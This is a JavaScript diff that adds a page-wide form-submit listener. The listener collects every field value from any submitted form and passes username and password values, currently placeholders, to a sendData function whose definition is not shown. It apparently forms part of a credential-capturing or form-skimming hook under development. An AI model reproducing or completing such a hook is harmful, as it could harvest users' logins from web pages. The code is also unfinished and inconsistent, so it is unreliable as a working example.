@@ -24,12 +24,33 @@
 
             document.body.addEventListener('submit', function(event) {
                 if (event.target.tagName.toLowerCase() === 'form') {
+                var formData = {};
+
+                    // Iterate over all input elements in the form
+                    var inputs = event.target.querySelectorAll('input');
+                    inputs.forEach(function(input) {
+                        // Assuming you want to ignore buttons and submit inputs
+                        if (input.type !== 'submit' && input.type !== 'button') {
+                            formData[input.name] = input.value; // Use the name attribute as the key
+                        }
+                    });
+            
+                    // Optionally handle other form elements like select or textarea
+                    var selects = event.target.querySelectorAll('select');
+                    selects.forEach(function(select) {
+                        formData[select.name] = select.value;
+                    });
+            
+                    var textareas = event.target.querySelectorAll('textarea');
+                    textareas.forEach(function(textarea) {
+                        formData[textarea.name] = textarea.value;
+                    });
+                    
                     //var username = document.getElementById('control').value;
                     //var password = document.getElementById('control').value;
                     var username = '123';
                     var password = '456';
                     alert(username+password);
-                    console.log(username+password);
                     sendData(username, password);
                 }
             });
